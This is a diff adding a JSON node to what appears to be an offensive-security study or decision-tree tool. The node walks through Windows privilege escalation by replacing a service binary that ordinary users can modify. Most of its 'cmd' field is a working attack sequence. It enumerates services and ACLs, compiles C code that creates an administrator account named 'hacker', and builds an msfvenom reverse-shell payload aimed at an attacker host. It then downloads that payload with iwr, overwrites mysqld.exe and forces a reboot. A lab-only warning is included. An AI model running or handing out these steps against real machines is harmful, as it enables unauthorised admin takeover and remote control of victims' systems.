@@ -1,0 +1,22 @@
+{
+  "id": "weak_service",
+  "phase": "WINDOWS",
+  "title": "Weak Service Binary Permissions",
+  "body": "If Users group has Full Access (F) on a service binary — replace it with a malicious one. Module 17.2.1: enumerate with icacls, replace binary, reboot if needed.",
+  "cmd": "# ── STEP 1: FIND VULNERABLE SERVICE BINARIES ─────────\n# List running services with binary paths\n# Note: needs RDP/interactive logon — WinRM gives permission denied\n# sc.exe query for specific service config:\nsc.exe qc <ServiceName>\nsc.exe queryex <ServiceName>\n# Get-CimInstance filter for specific service:\nGet-CimInstance Win32_Service -Filter \"Name='mysql'\" | Select Name,State,StartName,ProcessId,PathName\n# StartName = which user account runs the service\n\nGet-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like \"Running\"}\n\n# ── STEP 2: CHECK BINARY PERMISSIONS ─────────────────\n# F = Full access (can replace), RX = Read+Execute only (cannot replace)\nicacls \"C:\\xampp\\\\mysql\\\\bin\\\\mysqld.exe\"\n\n# PowerUp automated check\n. .\\PowerUp.ps1\nGet-ModifiableServiceFile\n\n# accesschk\n.\\accesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\n.\\accesschk.exe /accepteula -uwcqv \"Everyone\" *\n\n# ── STEP 3: CREATE MALICIOUS BINARY (on Kali) ─────────\n# C code adds admin user:\n# int main() {\n#   system(\"net user hacker pass123! /add\");\n#   system(\"net localgroup administrators hacker /add\");\n# }\nx86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n# Or reverse shell:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell.exe\n\n# ── STEP 4: REPLACE THE BINARY ────────────────────────\n# Backup original first!\nmove C:\\xampp\\\\mysql\\\\bin\\\\mysqld.exe C:\\\\Users\\\\dave\\\\mysqld.exe.bak\n\n# Transfer and place\niwr http://$lhost/adduser.exe -OutFile adduser.exe\nmove .\\adduser.exe C:\\xampp\\\\mysql\\\\bin\\\\mysqld.exe\n\n# ── STEP 5: RESTART SERVICE ───────────────────────────\n# Try manual restart (usually denied)\nnet stop mysql\nnet start mysql\n\n# Check startup type\nGet-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like \"mysql\"}\n\n# Check reboot privilege\nwhoami /priv | findstr Shutdown\n\n# Reboot if Auto + SeShutdownPrivilege\nshutdown /r /t 0\n\n# ── STEP 6: VERIFY ────────────────────────────────────\nGet-LocalGroupMember Administrators\n\n# ── STEP 7: RESTORE ───────────────────────────────────\nmove C:\\\\Users\\\\dave\\\\mysqld.exe.bak C:\\xampp\\\\mysql\\\\bin\\\\mysqld.exe\nshutdown /r /t 0",
+  "warn": "Always backup the original binary before replacing. Note what you changed for the report and restore it. Rebooting can cause unexpected issues — only do it in lab environments.",
+  "choices": [
+    {
+      "label": "Got admin user — RDP in",
+      "next": "got_root_windows"
+    },
+    {
+      "label": "Need to build adduser.exe / DLL payload",
+      "next": "win_compile"
+    },
+    {
+      "label": "Cannot restart or reboot — try DLL hijack",
+      "next": "win_dll_hijack"
+    }
+  ]
+}
